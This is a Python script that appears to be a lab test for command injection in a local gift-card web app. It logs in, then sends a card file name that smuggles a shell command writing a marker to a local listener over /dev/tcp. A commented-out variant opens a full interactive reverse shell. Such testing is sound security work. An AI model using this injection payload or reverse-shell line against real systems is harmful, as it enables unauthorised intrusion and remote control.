import re, requests
import time
import socket
from time import sleep

pyListener = socket.socket()
pyListener.bind(('127.0.0.1', 8877))
pyListener.listen()
with requests.Session() as s:

    get_token = s.get("http://127.0.0.1/login.html")
    csrf_token = re.search("csrfmiddlewaretoken\" value=\"(.*)?\"", get_token.text).group(1)
    url = "http://127.0.0.1/login.html"
    values = {
        "uname" : "LEGITLOGIN",
        "pword" : "PASSWORD",
        "csrfmiddlewaretoken" : csrf_token

    }
    req = s.post(url,data=values, allow_redirects = False)
    print (req.text)
    #print (s.cookies.values())
    for cookie in s.cookies:
        cookie.secure = False
    url = "http://127.0.0.1/useCard.html"
    get_token = s.get("http://127.0.0.1/useCard.html")
    #csrf_token = re.search("csrfmiddlewaretoken\" value=\"(.*)?\"", get_token.text).group(1)
    files = {'card_data': open('notacard.gftcrd','rb')}
    values = {
        "csrfmiddlewaretoken" : csrf_token,
        "card_supplied" : True,
        #"card_fname" : "; /bin/bash -c '/bin/bash -i > /dev/tcp/127.0.0.1/8888 0<&1 2>&1';"
        "card_fname" : "; /bin/bash -c 'echo 'YOUVEBEENHAD' > /dev/tcp/127.0.0.1/8877 0<&1 2>&1';"

    }
    req = s.post(url, files = files ,data=values)
    connection, address = pyListener.accept()
    sleep(3) # Probably not necessary, but may be useful
    output = connection.recv(1024).decode()
    result = output
    word = "YOUVEBEENHAD"
    print (output)
    if word in result:
        print('VULNERABLE to CMDI!')
    else:
        print('NOT VULNERABLE to CMDI')


    # print (req.headers)
    # print (req.cookies)
    #print (req.text)
    #req = s.get('http://127.0.0.1/gift/0')
    #print
